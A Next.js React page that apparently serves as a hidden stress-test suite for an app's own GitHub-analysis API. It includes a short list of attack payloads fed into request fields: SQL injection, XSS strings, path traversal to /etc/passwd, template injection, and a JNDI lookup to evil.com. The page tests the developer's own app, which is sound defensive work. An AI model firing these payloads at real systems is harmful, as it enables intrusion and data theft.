'use client'

import React, { useState, useEffect } from 'react'

interface TestResult {
  name: string
  status: 'running' | 'passed' | 'failed' | 'pending'
  duration?: number
  details?: string
  timestamp?: string
}

interface DynamicTestConfig {
  concurrentUsers: number
  testDuration: number
  randomSeed: number
  enableChaos: boolean
}

export default function StressTestPage() {
  const [testResults, setTestResults] = useState<TestResult[]>([])
  const [isRunning, setIsRunning] = useState(false)
  const [config, setConfig] = useState<DynamicTestConfig>({
    concurrentUsers: 10,
    testDuration: 30000, // 30 seconds
    randomSeed: Math.floor(Math.random() * 1000),
    enableChaos: true
  })

  // Dynamic test data that changes each run
  const generateDynamicTests = () => {
    const repos = [
      { owner: 'microsoft', repo: 'vscode' },
      { owner: 'facebook', repo: 'react' },
      { owner: 'google', repo: 'tensorflow' },
      { owner: 'torvalds', repo: 'linux' },
      { owner: 'nodejs', repo: 'node' }
    ]
    
    const maliciousPayloads = [
      "'; DROP TABLE users; --",
      "<script>alert('XSS')</script>",
      "../../etc/passwd",
      "{{7*7}}",
      "${jndi:ldap://evil.com}",
      "../../../windows/system32",
      "eval(process.exit())",
      "<img src=x onerror=alert(1)>"
    ]
    
    // Randomize based on seed
    const random = (seed: number) => {
      const x = Math.sin(seed++) * 10000
      return x - Math.floor(x)
    }
    
    const selectedRepo = repos[Math.floor(random(config.randomSeed) * repos.length)]
    const selectedPayload = maliciousPayloads[Math.floor(random(config.randomSeed + 1) * maliciousPayloads.length)]
    const randomBatchSize = Math.floor(random(config.randomSeed + 2) * 100) + 1
    
    return {
      selectedRepo,
      selectedPayload,
      randomBatchSize,
      hugeBatchSize: Math.floor(random(config.randomSeed + 3) * 1000) + 500
    }
  }

  const fixedTests = [
    {
      name: '🏥 Health Check Baseline',
      test: async () => {
        const response = await fetch('/api/health')
        return { status: response.status, data: await response.json() }
      }
    },
    {
      name: '🔥 Linux Kernel (Fixed Massive Test)',
      test: async () => {
        const response = await fetch('/api/github/analyze-repository-batch', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner: 'torvalds',
            repo: 'linux',
            batchIndex: 0,
            batchSize: 10
          })
        })
        return { status: response.status, data: await response.text() }
      }
    }
  ]

  const generateDynamicTestSuite = () => {
    const dynamic = generateDynamicTests()
    
    return [
      {
        name: `🎲 Random Repo: ${dynamic.selectedRepo.owner}/${dynamic.selectedRepo.repo}`,
        test: async () => {
          const response = await fetch('/api/github/analyze-repository-batch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              owner: dynamic.selectedRepo.owner,
              repo: dynamic.selectedRepo.repo,
              batchIndex: 0,
              batchSize: dynamic.randomBatchSize
            })
          })
          return { status: response.status, data: await response.text() }
        }
      },
      {
        name: `🚨 Security Test: ${dynamic.selectedPayload.substring(0, 20)}...`,
        test: async () => {
          const response = await fetch('/api/github/analyze-repository-batch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              owner: dynamic.selectedPayload,
              repo: dynamic.selectedPayload,
              batchIndex: 0,
              batchSize: 1
            })
          })
          return { status: response.status, data: await response.text() }
        }
      },
      {
        name: `💥 Huge Batch Size: ${dynamic.hugeBatchSize} files`,
        test: async () => {
          const response = await fetch('/api/github/analyze-repository-batch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              owner: 'octocat',
              repo: 'Hello-World',
              batchIndex: 0,
              batchSize: dynamic.hugeBatchSize
            })
          })
          return { status: response.status, data: await response.text() }
        }
      },
      {
        name: `⚡ Concurrent Load: ${config.concurrentUsers} users`,
        test: async () => {
          const promises = []
          for (let i = 0; i < config.concurrentUsers; i++) {
            promises.push(
              fetch('/api/health').then(r => r.status)
            )
          }
          const results = await Promise.allSettled(promises)
          const successful = results.filter(r => r.status === 'fulfilled' && r.value < 500).length
          return { 
            status: successful > config.concurrentUsers * 0.8 ? 200 : 500, 
            data: `${successful}/${config.concurrentUsers} requests succeeded` 
          }
        }
      }
    ]
  }

  const runTest = async (testConfig: any, index: number) => {
    const startTime = Date.now()
    
    setTestResults(prev => prev.map((result, i) => 
      i === index ? { ...result, status: 'running' } : result
    ))

    try {
      const result = await testConfig.test()
      const duration = Date.now() - startTime
      const passed = result.status < 500
      
      setTestResults(prev => prev.map((result, i) => 
        i === index ? {
          ...result,
          status: passed ? 'passed' : 'failed',
          duration,
          details: typeof result.data === 'string' ? result.data.substring(0, 200) : JSON.stringify(result.data).substring(0, 200),
          timestamp: new Date().toLocaleTimeString()
        } : result
      ))
    } catch (error) {
      const duration = Date.now() - startTime
      
      setTestResults(prev => prev.map((result, i) => 
        i === index ? {
          ...result,
          status: 'failed',
          duration,
          details: error instanceof Error ? error.message : 'Unknown error',
          timestamp: new Date().toLocaleTimeString()
        } : result
      ))
    }
  }

  const runAllTests = async () => {
    setIsRunning(true)
    
    // Combine fixed and dynamic tests
    const allTests = [...fixedTests, ...generateDynamicTestSuite()]
    
    // Initialize results
    setTestResults(allTests.map(test => ({
      name: test.name,
      status: 'pending'
    })))

    // Run tests sequentially to avoid overwhelming the server
    for (let i = 0; i < allTests.length; i++) {
      await runTest(allTests[i], i)
      // Small delay between tests
      await new Promise(resolve => setTimeout(resolve, 1000))
    }
    
    setIsRunning(false)
  }

  const randomizeConfig = () => {
    setConfig({
      concurrentUsers: Math.floor(Math.random() * 20) + 5, // 5-25 users
      testDuration: (Math.floor(Math.random() * 60) + 10) * 1000, // 10-70 seconds
      randomSeed: Math.floor(Math.random() * 10000),
      enableChaos: Math.random() > 0.5
    })
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'running': return 'text-yellow-600 bg-yellow-100'
      case 'passed': return 'text-green-600 bg-green-100'
      case 'failed': return 'text-red-600 bg-red-100'
      default: return 'text-gray-600 bg-gray-100'
    }
  }

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'running': return '⏳'
      case 'passed': return '✅'
      case 'failed': return '❌'
      default: return '⏸️'
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-6xl mx-auto px-4">
        {/* Header */}
        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">
            🔥 Enterprise Stress Test Suite
          </h1>
          <p className="text-gray-600">
            Hidden testing page for breaking the app - Netflix/Google/Amazon style
          </p>
          <div className="mt-4 text-sm text-yellow-600 bg-yellow-50 p-3 rounded">
            ⚠️ This page is hidden from users. Only accessible via direct URL.
          </div>
        </div>

        {/* Configuration Panel */}
        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
          <h2 className="text-xl font-semibold mb-4">🎛️ Dynamic Test Configuration</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Concurrent Users
              </label>
              <input
                type="number"
                value={config.concurrentUsers}
                onChange={(e) => setConfig(prev => ({ ...prev, concurrentUsers: parseInt(e.target.value) }))}
                className="w-full px-3 py-2 border border-gray-300 rounded-md"
                min="1"
                max="50"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Test Duration (ms)
              </label>
              <input
                type="number"
                value={config.testDuration}
                onChange={(e) => setConfig(prev => ({ ...prev, testDuration: parseInt(e.target.value) }))}
                className="w-full px-3 py-2 border border-gray-300 rounded-md"
                min="1000"
                max="300000"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Random Seed
              </label>
              <input
                type="number"
                value={config.randomSeed}
                onChange={(e) => setConfig(prev => ({ ...prev, randomSeed: parseInt(e.target.value) }))}
                className="w-full px-3 py-2 border border-gray-300 rounded-md"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Enable Chaos
              </label>
              <input
                type="checkbox"
                checked={config.enableChaos}
                onChange={(e) => setConfig(prev => ({ ...prev, enableChaos: e.target.checked }))}
                className="mt-3 w-4 h-4"
              />
            </div>
          </div>
          <div className="mt-4 flex gap-2">
            <button
              onClick={randomizeConfig}
              className="px-4 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700"
            >
              🎲 Randomize Config
            </button>
            <button
              onClick={runAllTests}
              disabled={isRunning}
              className="px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 disabled:bg-gray-400"
            >
              {isRunning ? '⏳ Breaking App...' : '🔥 Break The App'}
            </button>
          </div>
        </div>

        {/* Test Results */}
        <div className="bg-white rounded-lg shadow-md p-6">
          <h2 className="text-xl font-semibold mb-4">📊 Test Results</h2>
          
          {testResults.length === 0 ? (
            <div className="text-center py-8 text-gray-500">
              Click "Break The App" to start stress testing
            </div>
          ) : (
            <div className="space-y-4">
              {testResults.map((result, index) => (
                <div key={index} className="border rounded-lg p-4">
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-2">
                      <span className="text-lg">{getStatusIcon(result.status)}</span>
                      <h3 className="font-medium">{result.name}</h3>
                    </div>
                    <span className={`px-2 py-1 rounded text-sm ${getStatusColor(result.status)}`}>
                      {result.status.toUpperCase()}
                    </span>
                  </div>
                  
                  {result.duration && (
                    <div className="text-sm text-gray-600 mb-1">
                      Duration: {result.duration}ms
                    </div>
                  )}
                  
                  {result.timestamp && (
                    <div className="text-sm text-gray-600 mb-1">
                      Completed: {result.timestamp}
                    </div>
                  )}
                  
                  {result.details && (
                    <div className="text-sm text-gray-700 bg-gray-50 p-2 rounded mt-2">
                      {result.details}
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Summary Stats */}
        {testResults.length > 0 && (
          <div className="mt-6 bg-white rounded-lg shadow-md p-6">
            <h2 className="text-xl font-semibold mb-4">📈 Test Summary</h2>
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
              <div className="text-center">
                <div className="text-2xl font-bold text-green-600">
                  {testResults.filter(r => r.status === 'passed').length}
                </div>
                <div className="text-sm text-gray-600">Passed</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-red-600">
                  {testResults.filter(r => r.status === 'failed').length}
                </div>
                <div className="text-sm text-gray-600">Failed</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-yellow-600">
                  {testResults.filter(r => r.status === 'running').length}
                </div>
                <div className="text-sm text-gray-600">Running</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-blue-600">
                  {testResults.filter(r => r.duration).reduce((avg, r) => avg + (r.duration || 0), 0) / testResults.filter(r => r.duration).length || 0}ms
                </div>
                <div className="text-sm text-gray-600">Avg Response</div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
